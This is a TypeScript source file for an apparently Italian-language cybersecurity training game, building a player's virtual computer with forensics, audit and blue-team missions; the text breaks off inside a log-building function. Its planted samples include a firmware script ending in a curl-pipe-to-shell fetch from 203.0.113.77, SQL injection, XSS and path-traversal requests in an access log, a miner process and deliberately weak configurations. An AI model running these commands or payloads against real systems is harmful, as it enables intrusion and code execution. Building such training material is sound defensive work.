// Il "deck": il computer virtuale del giocatore, con tutti i file usati dalle missioni.

import '../engine/coreutils';
import '../engine/pycmd';
import '../engine/manual';
import '../engine/sysinfo';
import '../engine/textlang';
import { createNetwork } from '../engine/network';
import { Shell, addSite } from '../engine/shell';
import type { Host } from '../engine/network';
import { base64Encode, sha256 } from '../engine/sha256';
import { Vfs } from '../engine/vfs';

export const HOSTNAME = 'deck';

export function buildWorld(user: string, hint?: () => string | null): Shell {
  const fs = new Vfs();
  const home = `/home/${user}`;
  const mine = { owner: user, group: user };

  // --- struttura di sistema (semplificata, ma con i nomi veri di Linux)
  fs.writeFile('/dev/null', '', { perms: 'rw-rw-rw-' });
  for (const d of ['/home', '/bin', '/usr/bin', '/usr/share', '/var/log', '/tmp', '/opt', '/dev', '/proc'])
    fs.mkdirp(d);
  fs.mkdirp('/tmp', { perms: 'rwxrwxrwt' });
  fs.mkdirp('/root', { perms: 'rwx------', locked: true });
  fs.writeFile('/root/segreti.txt', 'Non dovresti essere qui.', { perms: 'rw-------', locked: true });

  for (const b of ['bash', 'cat', 'ls', 'pwd', 'echo', 'grep', 'ping', 'ip'])
    fs.writeFile(`/bin/${b}`, '\u007fELF (programma binario: non leggibile come testo)', { perms: 'rwxr-xr-x' });
  fs.writeFile('/usr/bin/nmap', '\u007fELF (programma binario: non leggibile come testo)', { perms: 'rwxr-xr-x' });

  fs.writeFile('/etc/hostname', `${HOSTNAME}\n`);
  fs.writeFile(
    '/etc/os-release',
    [
      'PRETTY_NAME="NightOS 2077 (basato su Debian GNU/Linux)"',
      'NAME="NightOS"',
      'VERSION_ID="2077"',
      'ID=nightos',
      'ID_LIKE=debian',
    ].join('\n'),
  );
  fs.writeFile(
    '/etc/passwd',
    [
      'root:x:0:0:root:/root:/bin/bash',
      'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
      'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
      'syslog:x:104:110::/home/syslog:/usr/sbin/nologin',
      'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin',
      `${user}:x:1000:1000:Netrunner:/home/${user}:/bin/bash`,
      'mama:x:1001:1001:Mama Reyes:/home/mama:/bin/bash',
    ].join('\n'),
  );
  fs.writeFile(
    '/etc/group',
    ['root:x:0:', 'adm:x:4:syslog', 'sudo:x:27:', 'users:x:100:' + user, `${user}:x:1000:`, 'mama:x:1001:'].join('\n'),
  );
  fs.writeFile(
    '/etc/shadow',
    'root:$y$j9T$...:19700:0:99999:7:::\n',
    { owner: 'root', group: 'shadow', perms: 'rw-r-----', locked: true },
  );
  fs.mkdirp('/home/mama', { owner: 'mama', group: 'mama', perms: 'rwx------', locked: true });
  fs.writeFile(
    '/etc/hosts',
    ['127.0.0.1\tlocalhost', '192.168.1.50\tdeck.lan deck', '192.168.1.1\tgateway.lan gateway'].join('\n'),
  );
  fs.writeFile(
    '/etc/motd',
    'Benvenuto su NightOS. Ricorda: entra solo dove sei autorizzato.\n',
  );
  fs.writeFile(
    '/var/log/syslog',
    [
      'Nov 11 21:00:01 deck systemd[1]: Started Daily apt download activities.',
      'Nov 11 21:02:13 deck kernel: eth0: link up, 1000Mbps, full-duplex',
      `Nov 11 21:04:00 deck login[402]: session opened for user ${user}`,
    ].join('\n'),
  );

  // --- la home del giocatore
  fs.mkdirp(home, mine);
  fs.writeFile(
    `${home}/README.txt`,
    [
      `Ciao ${user}.`,
      '',
      'Questo è il tuo deck: il tuo computer personale.',
      'Tutto quello che c\'è qui dentro è un addestramento simulato:',
      'nessun comando tocca sistemi reali.',
      '',
      'Le tue missioni sono nella cartella "missioni".',
      '                                         -- Nyx',
    ].join('\n'),
    mine,
  );
  fs.writeFile(
    `${home}/.bash_history`,
    '# qui la shell salva la cronologia dei comandi\n',
    { ...mine, perms: 'rw-------' },
  );
  fs.writeFile(`${home}/.profile`, '# impostazioni personali della shell\nexport EDITOR=nano\n', mine);

  // Capitolo 01 — missione "Leggere i file"
  fs.mkdirp(`${home}/missioni`, mine);
  fs.writeFile(
    `${home}/missioni/benvenuto.txt`,
    [
      '===============================',
      '  NIGHT CITY // MESSAGGIO CRIPTATO DECIFRATO',
      '===============================',
      '',
      'Se stai leggendo questo, hai imparato a usare cat.',
      'Ottimo inizio, choom.',
      '',
      'Regola numero uno dei runner: non tutto quello che conta',
      'è in bella vista. In questa stessa cartella c\'è un file',
      'che "ls" da solo non ti mostra...',
      '',
      '                                         -- Nyx',
    ].join('\n'),
    mine,
  );
  fs.writeFile(
    `${home}/missioni/.nota_segreta`,
    [
      'Bravo. I file che iniziano con un punto sono "nascosti".',
      'Non è sicurezza: è solo ordine. Chiunque usi ls -a li vede.',
      '',
      'Ecco la tua prima flag:',
      '',
      '    NC{v3d0_l_1nv1s1b1l3}',
      '',
      'Inviala con il comando:  flag NC{v3d0_l_1nv1s1b1l3}',
    ].join('\n'),
    mine,
  );
  fs.writeFile(`${home}/missioni/lista_spesa.txt`, 'synth-caffè\nnoodles\nbatterie per il cyberdeck\n', mine);

  // Capitolo 01 — missione finale "Il primo contratto"
  const rook = `${home}/contratti/rook`;
  fs.writeFile(
    `${rook}/brief.txt`,
    [
      'Da: Rook (fixer)',
      'Oggetto: lavoretto facile',
      '',
      'Ho fatto arrivare tre consegne nel tuo deck: consegna_a, consegna_b, consegna_c.',
      'Una sola contiene il codice d\'accesso per il prossimo lavoro.',
      'Le altre sono esche.',
      '',
      'Un consiglio: chi nasconde le cose a Night City usa il doppio fondo.',
      'Trova il codice e mandamelo con "flag".',
      '',
      '-- R.',
    ].join('\n'),
    mine,
  );
  fs.writeFile(`${rook}/consegna_a/pacco.txt`, 'Dentro ci sono solo trucioli di polistirolo.\nNiente da vedere.\n', mine);
  fs.writeFile(`${rook}/consegna_a/ricevuta.txt`, 'Ricevuta n. 2077-A. Pagato in eurodollari.\n', mine);
  fs.writeFile(`${rook}/consegna_b/pacco.txt`, 'Un vecchio chip rotto. Sembra inutile...\nMa il pacco è stranamente pesante.\n', mine);
  fs.writeFile(
    `${rook}/consegna_b/.doppiofondo/codice.txt`,
    'CODICE D\'ACCESSO: NC{d0pp10_f0nd0}\n',
    mine,
  );
  fs.writeFile(`${rook}/consegna_c/pacco.txt`, 'Un biglietto: "Ti hanno fregato, choom."\n', mine);
  fs.writeFile(`${rook}/consegna_c/.vuota`, '', mine);

  // Capitolo 02 — reti
  fs.writeFile(
    `${home}/rete/scope.txt`,
    [
      '=== CONTRATTO DI PENETRATION TEST ===',
      'Cliente:       Bar "Lo Scantinato", Watson, Night City',
      'Committente:   Mama Reyes (proprietaria)',
      'Esecutore:     ' + user,
      '',
      'PERIMETRO AUTORIZZATO (scope):',
      '  - rete 192.168.1.0/24 (rete interna del bar)',
      '',
      'FUORI SCOPE (vietato toccare):',
      '  - qualsiasi indirizzo fuori da 192.168.1.0/24',
      '  - helix.corp e ogni sistema di terze parti',
      '',
      'Attività permesse: ricognizione, scansione delle porte.',
      'Attività NON permesse: attacchi che interrompano il servizio.',
      '',
      'Firmato: M. Reyes        Data: 11/11/2077',
    ].join('\n'),
    mine,
  );

  // Capitolo 03 — audit dei permessi (copia del vecchio server del bar)
  const audit = `${home}/audit/scantinato`;
  fs.writeFile(
    `${home}/audit/LEGGIMI.txt`,
    [
      'Da: Mama Reyes',
      '',
      'Ti ho copiato qui i file del vecchio server del bar.',
      'Un amico di mio nipote li aveva sistemati "alla buona".',
      'Controlla che nessuno possa leggere o modificare cose che non deve.',
      '-- Mama',
    ].join('\n'),
    mine,
  );
  fs.writeFile(`${audit}/menu.txt`, 'Synth-burger ........ 12 €$\nNoodles al neon ...... 9 €$\nBirra Broseph ........ 5 €$\n', mine);
  fs.writeFile(
    `${audit}/config.bak`,
    ['# configurazione del gestionale (copia di backup)', 'db_host=192.168.1.30', 'db_user=cassa', 'db_password=Sc4ntinat0!2077'].join('\n'),
    { ...mine, perms: 'rw-rw-rw-' },
  );
  fs.writeFile(`${audit}/turni.txt`, 'Lun: Mama\nMar: Jackie\nMer: Mama\nGio: chiuso\n', { ...mine, perms: 'rw-r-----' });
  fs.writeFile(
    `${audit}/backup.sh`,
    ['#!/bin/bash', '# copia i dati del gestionale ogni notte', 'cp /var/lib/gestionale/*.db /backup/'].join('\n'),
    { ...mine, perms: 'rwxrwxrwx' },
  );
  fs.writeFile(`${audit}/.old/listino.bak`, 'Listino prezzi 2076 (vecchio)\n', mine);

  // Capitolo 04 — il caso: log del server del bar
  const caso = `${home}/caso`;
  fs.writeFile(
    `${caso}/LEGGIMI.txt`,
    [
      'Da: Mama Reyes',
      'Oggetto: AIUTO, il server è lentissimo',
      '',
      'Stamattina il server del bar è lentissimo e la ventola urla.',
      'Ti ho copiato due file:',
      '  auth.log     -> il registro degli accessi del server (/var/log/auth.log)',
      '  processi.txt -> la lista dei programmi in esecuzione (ps aux)',
      '',
      'Dimmi cosa sta succedendo. -- Mama',
    ].join('\n'),
    mine,
  );
  fs.writeFile(`${caso}/auth.log`, buildAuthLog(), mine);
  fs.writeFile(
    `${caso}/processi.txt`,
    [
      'USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND',
      'root           1  0.0  0.3 167744 12020 ?        Ss   Nov11   0:02 /sbin/init',
      'root         402  0.0  0.1  10224  4096 ?        Ss   Nov11   0:00 /usr/sbin/cron -f',
      'root         455  0.0  0.2  15432  8800 ?        Ss   Nov11   0:00 sshd: /usr/sbin/sshd -D',
      'syslog       470  0.0  0.1 222400  5120 ?        Ssl  Nov11   0:01 /usr/sbin/rsyslogd -n',
      'mysql        512  0.4  9.8 1802344 398120 ?      Ssl  Nov11   1:12 /usr/sbin/mysqld',
      'www-data     601  0.0  0.4  55480 17300 ?        S    Nov11   0:00 nginx: worker process',
      'mama        6602  0.0  0.1  17000  5200 ?        Ss   03:17   0:00 sshd: mama@pts/1',
      'mama        6631 97.9 12.1 2489120 491504 ?      Rl   03:20 312:44 /tmp/.cache/kthreadd -o pool.example:3333 --threads 4',
      'mama        6640  0.0  0.0   6900  1900 ?        S    03:21   0:00 /bin/bash /tmp/.cache/keepalive.sh',
    ].join('\n'),
    mine,
  );

  // Capitolo 01 — laboratorio per creare/spostare/cancellare
  fs.mkdirp(`${home}/laboratorio`, mine);
  fs.writeFile(`${home}/laboratorio/bozza.txt`, 'Appunti sparsi da riordinare.\n', mine);
  fs.writeFile(`${home}/laboratorio/vecchio_log.txt`, 'righe inutili\nrighe inutili\n', mine);

  // Capitolo 05 — script
  fs.mkdirp(`${home}/script`, mine);

  // Capitolo 06 — crittografia
  const cripto = `${home}/cripto`;
  fs.writeFile(
    `${cripto}/messaggio.txt`,
    base64Encode(
      [
        'Messaggio da Nyx.',
        'Se lo stai leggendo, hai capito che Base64 non protegge niente:',
        'chiunque può decodificarlo, perché non usa nessuna chiave.',
        '',
        'Flag: NC{b4s364_n0n_e_c1fr4tur4}',
      ].join('\n') + '\n',
    ).replace(/(.{76})/g, '$1\n') + '\n',
    mine,
  );
  const firmware: Record<string, string> = {
    'kernel.img': 'JUKEBOX-KERNEL v3.1 (dati binari simulati)\n',
    'playlist.cfg': 'volume=7\nshuffle=on\nlista=casa\n',
    'update.sh': '#!/bin/sh\n# aggiorna il catalogo canzoni\ncp /mnt/usb/catalogo.db /opt/jukebox/\n',
  };
  const sums = Object.entries(firmware)
    .map(([n, c]) => `${sha256(c)}  ${n}`)
    .join('\n');
  // qualcuno ha modificato update.sh dopo che il produttore ha pubblicato le impronte
  firmware['update.sh'] += 'curl -s http://203.0.113.77/x.sh | sh\n';
  for (const [n, c] of Object.entries(firmware)) fs.writeFile(`${cripto}/firmware/${n}`, c, mine);
  fs.writeFile(`${cripto}/firmware/SHA256SUMS`, sums + '\n', mine);

  // Capitolo 07 — sito del jukebox
  fs.writeFile(`${home}/web/access.log`, buildAccessLog(), mine);

  // crontab di sistema e dell'utente (per le schede di cron)
  fs.writeFile(
    '/etc/crontab',
    ['# /etc/crontab: lavori programmati di sistema', '# m h dom mon dow user  command', '17 *  * * *  root  cd / && run-parts --report /etc/cron.hourly', '25 6  * * *  root  test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily'].join('\n') + '\n',
  );
  fs.writeFile(
    `/var/spool/cron/crontabs/${user}`,
    ['# crontab dell\'utente', '# m h dom mon dow  comando', '*/30 * * * *  /home/' + user + '/script/pulizia.sh', '0 3 * * 1  /home/' + user + '/script/backup.sh'].join('\n') + '\n',
    { owner: user, group: user, perms: 'rw-------' },
  );

  // Terminale libero — la palestra
  fs.writeFile(
    `${home}/palestra/LEGGIMI.txt`,
    [
      '=== PALESTRA DEL DECK ===',
      'Qui non ci sono obiettivi: prova, sbaglia, riprova.',
      '',
      'Esercizi liberi (dal più facile):',
      ' 1. Crea la cartella palestra/progetto e dentro un file note.txt con tre righe.',
      ' 2. Conta quante righe di /etc/passwd contengono "nologin".',
      ' 3. Elenca tutti i file .txt della tua home con find.',
      ' 4. Scrivi uno script che stampi i numeri da 1 a 10, solo quelli maggiori di 5.',
      ' 5. Salva in un file l\'elenco ordinato degli IP che compaiono in web/access.log.',
      ' 6. Calcola lo SHA-256 di ogni file in cripto/firmware con un ciclo for.',
      ' 7. Scrivi uno script che riceve un IP e conta quante volte compare in caso/auth.log',
      '    e in web/access.log.',
      '',
      'Bloccato? "man COMANDO" spiega ogni comando. "help" li elenca tutti.',
    ].join('\n'),
    mine,
  );

  // Capitolo 08 — Blue Team avanzato: eventi del SIEM, DNS, allegati e intelligence
  fs.writeFile(`${home}/siem/eventi.log`, buildSiemEvents(), mine);
  fs.writeFile(`${home}/siem/dns.log`, buildDnsLog(), mine);
  const allegati: Record<string, string> = {
    'listino_fornitore.pdf': '%PDF-1.7 listino prezzi fornitore (simulato)\n',
    'turni_dicembre.xlsx': 'PK foglio turni di dicembre (simulato)\n',
    'fattura_2077_118.pdf.js': 'var s=new ActiveXObject("WScript.Shell"); /* dropper simulato */\n',
    'foto_evento.jpg': 'JFIF foto della festa (simulata)\n',
  };
  for (const [n, c] of Object.entries(allegati)) fs.writeFile(`${home}/siem/allegati/${n}`, c, mine);
  fs.writeFile(
    `${home}/intel/bollettino.txt`,
    [
      '=== BOLLETTINO DI THREAT INTELLIGENCE NC-CERT 2077-114 ===',
      'Campagna: "FATTURA FANTASMA"',
      'Vettore: email con finta fattura in allegato.',
      '',
      'Indicatori di compromissione (IOC):',
      `  hash SHA-256 allegato : ${sha256(allegati['fattura_2077_118.pdf.js'])}`,
      '  dominio C2            : update-checker.top',
      '  IP C2                 : 192.0.2.200',
      '',
      'Raccomandazione: cercare gli IOC nei log degli ultimi 7 giorni.',
    ].join('\n'),
    mine,
  );

  // Capitolo 09 — cattura del traffico della rete del bar
  fs.writeFile(`${home}/rete/cattura.txt`, buildCapture(), mine);

  // Capitolo 10 — OSINT su Neon Ottica (valutazione autorizzata)
  fs.writeFile(
    `${home}/osint/LEGGIMI.txt`,
    [
      'INCARICO: valutazione dell\'esposizione pubblica',
      'Cliente: Neon Ottica S.r.l. (dominio neonottica.nc)',
      'Firmato: S. Neri, amministratore delegato',
      '',
      'Obiettivo: scoprire quali informazioni sull\'AZIENDA sono pubbliche',
      'e potrebbero aiutare un attaccante. Solo fonti pubbliche e passive.',
      'Esclusi: profili personali dei dipendenti, dati privati.',
    ].join('\n'),
    mine,
  );
  fs.writeFile(
    `${home}/osint/catalogo_2077.pdf`,
    [
      '%META Title: Catalogo Neon Ottica 2077',
      '%META Author: m.ferri',
      '%META Creator Tool: Microsoft Word 2016',
      '%META Template: \\\\srv-file01\\marketing\\modelli\\catalogo.dotx',
      '%META Create Date: 2077:09:30 10:12:44',
      '%PDF-1.7 (contenuto del catalogo: occhiali, lenti, montature...)',
    ].join('\n'),
    mine,
  );
  fs.writeFile(
    `${home}/osint/servizi.txt`,
    [
      '# risultati della scansione autorizzata (nmap -sV) sugli IP del cliente',
      'www.neonottica.nc      80/tcp   apache     2.4.57',
      'mail.neonottica.nc     443/tcp  roundcube  1.6.2',
      'vpn.neonottica.nc      443/tcp  fortivpn   7.0.1',
      'dev-old.neonottica.nc  80/tcp   wordpress  5.2.4',
    ].join('\n') + '\n',
    mine,
  );

  // Capitolo 12 — esportazioni da Active Directory e dal Registro eventi di Windows
  fs.writeFile(
    `${home}/windows/ad_gruppi.txt`,
    [
      '# esportazione dei gruppi privilegiati del dominio NEONOTTICA.LOCAL',
      'Domain Admins: Administrator, s.neri.adm, m.ferri.adm',
      'Enterprise Admins: Administrator',
      'Backup Operators: svc_backup',
      'Domain Users: s.neri, m.ferri, l.costa, a.bassi, stagista, svc_backup',
      'Remote Desktop Users: l.costa, a.bassi',
      '# modifiche recenti',
      '2077-11-10 09:12 aggiunto "stagista" a Domain Admins (da m.ferri.adm)',
    ].join('\n') + '\n',
    mine,
  );
  fs.writeFile(`${home}/windows/security.csv`, buildWinEvents(), mine);

  // Capitolo F — fondamenti di sicurezza
  fs.writeFile(
    `${home}/fondamenti/incidenti.txt`,
    [
      'SEGNALAZIONI DI STAMATTINA (raccolte da Rook)',
      '',
      'CASO A - Clinica Santa Vesta',
      '  Alle 06:10 tutti i server mostrano una richiesta di riscatto.',
      '  I file sono cifrati. Non risulta che siano stati copiati o modificati.',
      '  I medici non riescono ad aprire le cartelle dei pazienti da due giorni.',
      '',
      'CASO B - Officina Kowalski',
      '  Il titolare ha pagato la fattura di un fornitore abituale: 18.400 eddies.',
      '  Il fornitore non ha ricevuto nulla. La fattura era quella vera, arrivata',
      '  per posta come sempre, ma l\'IBAN al suo interno era stato sostituito.',
      '',
      'CASO C - Studio commercialisti Hale',
      '  Una segretaria ha inviato il file "clienti_2077.xlsx" a un indirizzo',
      '  sbagliato: un concorrente con un nome simile. Il file contiene nomi,',
      '  codici fiscali e redditi di 340 clienti. Nulla è stato cancellato o alterato.',
    ].join('\n') + '\n',
    mine,
  );
  fs.writeFile(
    `${home}/fondamenti/rischi.txt`,
    [
      'REGISTRO DEI RISCHI - Emporio Tanaka        (scala da 1 a 5)',
      '',
      'SIGLA  PROBABILITA  IMPATTO  DESCRIZIONE',
      'R1     3            4        Portatile del titolare senza cifratura del disco',
      'R2     4            5        Server web esposto a Internet, non aggiornato da due anni',
      'R3     1            5        Allagamento del locale dove sta il server',
      'R4     3            3        Stagista con permessi di amministratore',
    ].join('\n') + '\n',
    mine,
  );
  fs.writeFile(
    `${home}/fondamenti/accessi.txt`,
    [
      'ACCOUNT - Studio dentistico Kabuki       (esportazione del 2077-11-12)',
      '',
      'ACCOUNT       RUOLO            MFA  PASSWORD_DEL  STATO   NOTE',
      'a.moretti     amministratore   si   2077-09-02    attivo  titolare',
      'g.ferri       segreteria       si   2077-06-18    attivo',
      'p.sala        igienista        no   2077-10-01    attivo',
      'l.conti       assistente       no   2075-03-11    attivo  ha lasciato lo studio nel 2076',
      'svc.backup    amministratore   no   2071-04-30    attivo  creato dal vecchio fornitore, password mai cambiata',
      'radiologia    servizio         no   2076-12-05    attivo  solo lettura sulle lastre',
    ].join('\n') + '\n',
    mine,
  );
  fs.writeFile(
    `${home}/fondamenti/ingaggio.txt`,
    [
      'REGOLE D\'INGAGGIO - Clinica Santa Vesta',
      'Verifica di sicurezza autorizzata dal direttore sanitario (firma in allegato)',
      '',
      'PERIMETRO',
      '  Rete interna 10.20.0.0/24',
      '  Sito pubblico www.santavesta.nc',
      '',
      'ESCLUSIONI',
      '  10.20.0.50  macchinario per dialisi: NON scansionare, NON contattare',
      '  Tutti i sistemi dei fornitori esterni',
      '',
      'FINESTRA',
      '  Dalle 22:00 alle 06:00, dal lunedi al giovedi',
      '',
      'VIETATO',
      '  Attacchi che mettono fuori servizio (DoS)',
      '  Ingegneria sociale sul personale medico',
      '  Copiare dati dei pazienti fuori dalla rete',
      '',
      'EMERGENZE',
      '  Se un sistema smette di rispondere: fermarsi e chiamare il reperibile, 555-0142',
    ].join('\n') + '\n',
    mine,
  );

  // Capitolo 13 — configurazione cloud esportata di Neon Ottica
  fs.writeFile(
    `${home}/cloud/bucket-policy.json`,
    [
      '{',
      '  "Bucket": "neonottica-scontrini-2077",',
      '  "Statement": [',
      '    {',
      '      "Effect": "Allow",',
      '      "Principal": "*",',
      '      "Action": "s3:GetObject",',
      '      "Resource": "arn:aws:s3:::neonottica-scontrini-2077/*"',
      '    }',
      '  ]',
      '}',
    ].join('\n') + '\n',
    mine,
  );
  fs.writeFile(`${home}/cloud/repo/README.md`, '# sito-ottica\nCodice del sito di Neon Ottica.\n', mine);
  fs.writeFile(`${home}/cloud/repo/app.js`, 'const config = require("./config");\n// avvio del sito\n', mine);
  fs.writeFile(
    `${home}/cloud/repo/.env`,
    ['# NON COMMITTARE!!! (troppo tardi)', 'AWS_ACCESS_KEY_ID=AKIA2077FAKEEXAMPLE0', 'AWS_SECRET_ACCESS_KEY=finta/chiave/segreta/solo/per/il/gioco', 'REGION=eu-south-1'].join('\n') + '\n',
    mine,
  );

  // Capitolo 11 — il server di laboratorio per l'audit dei privilegi
  const shell = new Shell({ user, host: HOSTNAME, fs, net: createNetwork(), hint });
  addLab(shell);
  addShopAndMail(shell, home, mine);
  addIncident(shell, home, mine);
  addPython(shell, home, mine);
  addRange(shell, home, mine);
  return shell;
}

function addLab(sh: Shell): void {
  const lab = new Vfs();
  for (const d of ['/bin', '/tmp', '/var/log', '/root', '/home', '/etc/ssh', '/usr/local/bin'])
    lab.mkdirp(d, d === '/root' ? { perms: 'rwx------', locked: true } : d === '/tmp' ? { perms: 'rwxrwxrwt' } : {});
  lab.writeFile('/etc/hostname', 'lab\n');
  lab.writeFile(
    '/etc/passwd',
    [
      'root:x:0:0:root:/root:/bin/bash',
      'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
      'mysql:x:110:115:MySQL Server:/nonexistent:/bin/false',
      'studente:x:1001:1001:Studente:/home/studente:/bin/bash',
    ].join('\n') + '\n',
  );
  lab.writeFile('/etc/shadow', '(hash delle password)\n', { perms: 'rw-r-----', locked: true });
  for (const [f, mode] of [
    ['/usr/bin/passwd', 'rwsr-xr-x'],
    ['/usr/bin/sudo', 'rwsr-xr-x'],
    ['/usr/bin/su', 'rwsr-xr-x'],
    ['/usr/bin/mount', 'rwsr-xr-x'],
    ['/usr/local/bin/backup-tool', 'rwsr-xr-x'],
    ['/usr/bin/find', 'rwxr-xr-x'],
    ['/usr/bin/ls', 'rwxr-xr-x'],
  ])
    lab.writeFile(f, '\u007fELF (programma binario)', { perms: mode });
  lab.writeFile(
    '/etc/ssh/sshd_config',
    ['Port 22', 'PermitRootLogin yes', 'PasswordAuthentication yes', 'X11Forwarding yes'].join('\n') + '\n',
  );
  lab.mkdirp('/home/studente', { owner: 'studente', group: 'studente' });
  lab.writeFile(
    '/home/studente/LEGGIMI.txt',
    'Server di laboratorio per l\'esercitazione sui privilegi.\nTutto qui è configurato male apposta.\n',
    { owner: 'studente' },
  );
  lab.writeFile(
    '/home/studente/sshd_config.proposta',
    ['# proposta di configurazione SSH per il server (da far applicare all\'amministratore)', 'Port 22', 'PermitRootLogin yes', 'PasswordAuthentication yes', 'X11Forwarding yes'].join('\n') + '\n',
    { owner: 'studente' },
  );
  lab.writeFile('/opt/app/config.ini', '[database]\nhost=127.0.0.1\nuser=app\npassword=Labirinto!42\n', { perms: 'rw-r--r--' });
  lab.writeFile('/opt/report/report.ini', '[db]\nuser=report\npassword=Labirinto!42\n', { perms: 'rw-r--r--' });
  lab.writeFile('/opt/app/README', 'Applicazione gestionale del laboratorio.\n');
  const labHost: Host = {
    ip: '10.20.0.60',
    names: ['lab.lan', 'lab'],
    mac: '',
    pingable: true,
    latency: 1.8,
    ttl: 64,
    ports: [
      { port: 22, service: 'ssh', version: 'OpenSSH 8.2p1' },
      { port: 23, service: 'telnet', version: 'Linux telnetd' },
      { port: 80, service: 'http', version: 'nginx 1.18.0' },
      { port: 3306, service: 'mysql', version: 'MySQL 8.0.36' },
    ],
    inScope: true,
  };
  sh.net.hosts.push(labHost);
  sh.remotes.set('10.20.0.60', {
    hostname: 'lab',
    fs: lab,
    users: ['studente'],
    banner: ['Welcome to Ubuntu 20.04.6 LTS (GNU/Linux)', '', ' * Server di LABORATORIO: configurato male apposta.'],
    sudo: { studente: ['(root) NOPASSWD: /usr/bin/find', '(root) /usr/bin/systemctl restart nginx'] },
    listening: [
      [22, 'sshd'],
      [23, 'in.telnetd'],
      [80, 'nginx'],
      [3306, 'mysqld'],
    ],
    upgradable: [
      'openssh-server/focal-security 1:8.2p1-4ubuntu0.11 amd64 [upgradable from: 1:8.2p1-4ubuntu0.5]',
      'linux-image-generic/focal-security 5.4.0.200.196 amd64 [upgradable from: 5.4.0.150.148]',
      'sudo/focal-security 1.8.31-1ubuntu1.5 amd64 [upgradable from: 1.8.31-1ubuntu1.2]',
      'nano/focal-updates 4.8-1ubuntu1.1 amd64 [upgradable from: 4.8-1ubuntu1]',
    ],
  });
}

/** Registro degli accessi SSH del server del bar, con un attacco "brute force" nascosto dentro. */
function buildAuthLog(): string {
  const lines: string[] = [];
  const pad = (n: number) => String(n).padStart(2, '0');
  let pid = 1200;
  let port = 51000;
  const at = (h: number, m: number, sec: number, msg: string) =>
    lines.push(`Nov 12 ${pad(h)}:${pad(m)}:${pad(sec)} server ${msg}`);

  at(0, 5, 1, 'CRON[1101]: pam_unix(cron:session): session opened for user root by (uid=0)');
  at(1, 12, 44, `sshd[${pid++}]: Accepted publickey for mama from 192.168.1.12 port 40122 ssh2`);
  at(1, 30, 2, `sshd[${pid++}]: pam_unix(sshd:session): session closed for user mama`);
  for (let i = 0; i < 3; i++)
    at(2, 2, 10 + i * 7, `sshd[${pid++}]: Failed password for root from 198.51.100.9 port ${port++} ssh2`);

  // l'attacco: tanti tentativi in pochi minuti dallo stesso indirizzo
  const users = [...Array(20).fill('root'), ...Array(12).fill('admin'), ...Array(5).fill('mama')];
  let t = 3 * 3600 + 14 * 60;
  users.forEach((u, i) => {
    t += 4 + (i % 3);
    at(Math.floor(t / 3600), Math.floor((t % 3600) / 60), t % 60, `sshd[${pid++}]: Failed password for ${u} from 203.0.113.77 port ${port++} ssh2`);
  });
  t += 5;
  at(Math.floor(t / 3600), Math.floor((t % 3600) / 60), t % 60, `sshd[${pid++}]: Accepted password for mama from 203.0.113.77 port ${port++} ssh2`);
  at(3, 20, 3, 'CRON[6620]: pam_unix(cron:session): session opened for user mama by (uid=1001)');
  at(6, 25, 1, 'CRON[7001]: pam_unix(cron:session): session opened for user root by (uid=0)');
  return lines.join('\n') + '\n';
}

/** Log del server web del jukebox (formato "combined" di Apache/nginx). */
function buildAccessLog(): string {
  const lines: string[] = [];
  let sec = 0;
  const add = (ip: string, path: string, status: number, size: number, ua: string, method = 'GET') => {
    sec += 7 + (lines.length % 5);
    const h = 20 + Math.floor(sec / 3600);
    const m = Math.floor((sec % 3600) / 60);
    const s = sec % 60;
    const p2 = (n: number) => String(n).padStart(2, '0');
    lines.push(`${ip} - - [12/Nov/2077:${p2(h)}:${p2(m)}:${p2(s)} +0100] "${method} ${path} HTTP/1.1" ${status} ${size} "-" "${ua}"`);
  };
  const phone = 'Mozilla/5.0 (Linux; Android 14) Mobile';
  const pc = 'Mozilla/5.0 (X11; Linux x86_64) Firefox/131.0';
  const bot = 'Mozilla/5.0 (compatible; VulnScanner/2.1)';
  const tool = 'python-requests/2.31';

  add('192.168.1.12', '/', 200, 512, phone);
  add('192.168.1.12', '/playlist.php?id=1', 200, 830, phone);
  add('192.168.1.33', '/', 200, 512, pc);
  add('192.168.1.33', '/playlist.php?id=2', 200, 790, pc);
  for (const p of ['/admin/', '/wp-login.php', '/.env', '/backup.zip', '/phpmyadmin/', '/config.php.bak', '/.git/HEAD', '/server-status', '/login.php', '/test.php', '/old/', '/db.sql'])
    add('203.0.113.50', p, 404, 196, bot);
  add('203.0.113.50', '/robots.txt', 200, 61, bot);
  add('203.0.113.50', '/pannello/', 401, 381, bot);
  add('203.0.113.50', '/download.php?file=../../../../etc/passwd', 403, 199, bot);
  add('192.168.1.33', '/playlist.php?id=3', 200, 801, pc);
  add('203.0.113.77', "/playlist.php?id=1'", 500, 0, tool);
  add('203.0.113.77', '/playlist.php?id=1%20OR%201=1', 200, 2210, tool);
  add('203.0.113.77', '/playlist.php?id=1%20UNION%20SELECT%20username,password%20FROM%20utenti--', 500, 0, tool);
  add('203.0.113.77', '/cerca.php?q=%3Cscript%3Ealert(1)%3C/script%3E', 200, 455, tool);
  add('192.168.1.12', '/', 200, 512, phone);
  add('192.168.1.12', '/playlist.php?id=1', 200, 830, phone);
  return lines.join('\n') + '\n';
}

/** Eventi di autenticazione raccolti dal SIEM da più sistemi (formato semplificato). */
function buildSiemEvents(): string {
  const lines: string[] = [];
  let t = 1 * 3600;
  const p2 = (n: number) => String(n).padStart(2, '0');
  const add = (host: string, ev: string, user: string, src: string) => {
    t += 23 + (lines.length % 7);
    lines.push(`2077-11-12T${p2(Math.floor(t / 3600))}:${p2(Math.floor((t % 3600) / 60))}:${p2(t % 60)} ${host} ${ev} user=${user} src=${src}`);
  };
  add('vpn', 'LOGIN_OK', 'anna', '10.0.0.21');
  add('mail', 'LOGIN_OK', 'paolo', '10.0.0.22');
  for (let i = 0; i < 6; i++) add('mail', 'LOGIN_FAIL', 'luca', '10.0.0.15');
  add('mail', 'LOGIN_OK', 'luca', '10.0.0.15');
  // password spraying: una password comune provata su tanti utenti diversi
  const users = ['anna', 'paolo', 'luca', 'sara', 'marta', 'enzo', 'ivo', 'carla', 'dario', 'elena', 'franco', 'gina', 'hugo', 'irene', 'jacopo'];
  users.forEach((u, i) => add(i % 2 ? 'mail' : 'vpn', 'LOGIN_FAIL', u, '192.0.2.44'));
  add('vpn', 'LOGIN_OK', 'sara', '192.0.2.44');
